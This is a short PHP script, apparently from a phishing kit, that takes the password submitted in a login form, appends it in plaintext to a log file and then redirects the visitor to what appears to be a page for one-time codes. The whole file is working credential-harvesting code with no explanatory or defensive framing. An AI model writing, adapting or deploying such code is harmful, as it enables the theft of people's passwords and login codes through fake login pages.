<?php

    file_put_contents("log.txt", "Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();